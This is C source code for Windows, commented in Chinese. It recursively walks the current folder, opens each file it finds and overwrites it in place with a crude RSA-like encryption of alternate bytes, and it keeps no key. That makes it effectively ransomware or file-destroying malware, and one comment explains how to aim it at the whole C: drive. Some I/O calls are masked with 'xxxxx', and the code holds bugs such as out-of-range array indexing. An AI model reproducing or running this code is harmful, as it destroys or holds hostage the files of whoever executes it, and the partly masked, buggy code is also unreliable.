#include "stdafx.h"
#include <string.h>
#include <stdlib.h>
#include <windows.h>

int len;
char crp,crp2;
char c[201]={0};
int p[10]={11,17,23,37,43,53,61,71,79,89},q[10]={13,19,29,31,41,47,59,67,73,83};

int de_key(int e,int t)//求私钥 
{
	for(int d=0;d<t;d++)
	{
		if(e*d%t==1)
		{
			return d;
		}
	}
}

bool gcd(int p,int q)//判断两个数是不是互质。
{
	int t,s;   //q=s*p+t;
	if(q<p)
	{
		t=p;
		p=q;
		q=t;
	}
	t=q%p;
	s=q/p; 
	while(t!=0)
	{
		
	    q=p;
		p=t;
		t=q%p;
		s=q/p;
	}
	if(t==0&&s==q)
	{
		return true;
    }
    else
	{
    	return false;
	}
}

void encode(char* filename)
{
	FILE* fp=NULL;//文件指针,代表一个文件
	fp=fopen(filename,"r+");
	
	printf("打开%s成功！\n",filename);
	fseek(fp,0,SEEK_END);//设置光标内容指针到尾
	len=ftell(fp);
	fseek(fp,0,SEEK_SET);//设置光标指针到头
	printf("文件大小为%d字节！\n",len);//当我们知道文件字节了以后就可以在每个字节后面插入字符
	//加密
	int e,n,fai_n,pp,qq,ans;
	pp=p[rand()%11];
	qq=q[rand()%11];
	n=pp*qq;
	fai_n=(pp-1)*(qq-1); 
	ans=0;
	while(ans==0)
	{
		e=rand()%100;
		while(e==0)
	    {
			e=rand()%100;
		}
		ans=gcd(e,fai_n);
	}

	for(int i=0;i<len;i+=2)
	{
		crp2=xxxxx(xx);//读取文件里面的字符 
		c[i]=crp2;
	}
	ans=1;
	for(int i=0;i<len;i+=2)
	{
		for(int j=0;j<e;j++)
	   {
			ans=ans*c[i]%n;
	   }
	   c[i]=ans;
	   ans=1;
	}
	fseek(fp,0,SEEK_SET);//初始化指针到头
	for(int i=0;i<len;i+=2)
	{
		crp=c[i];
		xxxxxx(&xxx,1,1,xx);//字符串xxx往xx文件里面添加个1字节，每次添加一次
		xxxxx(xx,1,xxxx_xxx);//每隔1个字节添加一次,当前位置  ex: helloworld -> aealawarad,当然这块地方也可以换成N个字节加密一次，但这样每轮i就要加N+1次
	}
	printf("加密该文件！\n");
	fclose(xx);
}


void findfile(char* pathname)
{
	char findfilename[1<<12];
	memset(findfilename,0,sizeof(findfilename));
	sprintf(findfilename,"%s\\*.*",pathname);//寻找文件夹下面的文件
	WIN32_FIND_DATA finddata;//结构体
	HANDLE hfile=FindFirstFile(findfilename,&finddata);//传地址给结构体赋值

	char arr[1<<12]={0};
	int flag=1;
	while(flag)
	{
		if(finddata.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)//如果找到文件夹，设置文件夹名字并找里面的文件。dwFileAttributes是文件属性，FILE_ATTRIBUTE_DIRECTORY是文件夹
		{
			if(finddata.cFileName[0]!='.')
			{
				memset(arr,0,sizeof(arr));
				sprintf(arr,"%s\\%s",pathname,finddata.cFileName);//把上一个文件夹和当前找到的文件夹目录拼接在一起放到arr数组里
				printf("找到文件夹：%s\n",arr);
				findfile(arr);
			}
		}
		else
		{
			memset(arr,0,sizeof(arr));
			sprintf(arr,"%s\\%s",pathname,finddata.cFileName);
			printf("找到文件：%s\n",arr);
			encode(arr);
		}
		flag=FindNextFile(hfile,&finddata);//继续找下一个
	}
}


int _tmain(int argc, _TCHAR* argv[])
{
	char buffer[1<<12]={0};
	GetCurrentDirectory(sizeof(buffer),buffer);//获取当前文件夹到buffer,记得点编译器上面的项目-属性-常规-字符集-多字节字符集
	/*buffer[0]='C';//如果想要从C盘根目录下面加密文件的话，不能用RSA,把RSA相关函数和代码注释掉，然后crp换成固定的字符，可能循环数i也得尽量少循环。
	buffer[1]=':';
	buffer[2]='\\';*/

	findfile(buffer);//当前文件夹，当然也可以加c盘
	return 0;
}
